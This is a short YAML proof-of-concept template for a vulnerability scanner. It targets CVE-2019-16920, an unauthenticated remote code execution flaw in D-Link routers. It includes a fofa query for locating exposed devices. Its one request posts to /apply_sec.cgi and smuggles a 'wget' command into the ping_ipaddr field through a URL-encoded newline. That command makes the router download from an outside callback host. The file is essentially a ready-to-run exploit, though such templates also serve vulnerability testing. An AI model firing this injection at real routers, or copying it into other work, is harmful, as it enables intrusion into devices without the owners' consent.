id: CVE-2019-16920

info:
    name: D-Link Unauthenticated remote code
    author: JingLing(https://hackfun.org/)
    severity: critical
    description: fofa app="D_Link-Router"
    reference:
        - https://nvd.nist.gov/vuln/detail/CVE-2019-16920
    
set:
    reverse: newReverse()
    reverseURL: reverse.url
rules:
    r0:
        request:
            method: POST
            path: /apply_sec.cgi
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20{{reverseURL}}
            follow_redirects: true
        expression: response.status == 200 && reverse.wait(5)
expression: r0()

